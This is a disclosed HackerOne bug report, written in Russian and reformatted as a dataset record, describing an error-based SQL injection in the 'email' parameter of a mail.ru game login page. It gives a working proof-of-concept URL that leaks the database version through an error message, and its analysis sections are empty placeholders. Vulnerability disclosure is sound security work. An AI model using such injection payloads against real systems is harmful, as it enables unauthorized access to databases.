---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '137956'
original_report_id: '137956'
title: SQL Injection
weakness: SQL Injection
team_handle: mailru
created_at: '2016-05-11T17:15:04.865Z'
disclosed_at: '2016-05-26T11:32:52.637Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- sql-injection
---

# SQL Injection

## Metadata

- HackerOne Report ID: 137956
- Weakness: SQL Injection
- Program: mailru
- Disclosed At: 2016-05-26T11:32:52.637Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Добрый день. Из за недостаточной фильтрации GET параметра "email" можно провести атаку типа SQL Injection. Вектор атаки - Error based.

PoC (вывод версии СУБД)

https://townwars.mail.ru/?c=Login2&m=Auth&email=1'+and+1=(select+version()::bigint)--&pass=test&save_me=0&origin=0&target=WwwForum

вывод данных в ошибке 

"PostgreSQL 9.0.1 on amd64-portbld-freebsd8.1, compiled by GCC cc (GCC) 4.2.1 20070719 [FreeBSD], 64-bit"

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
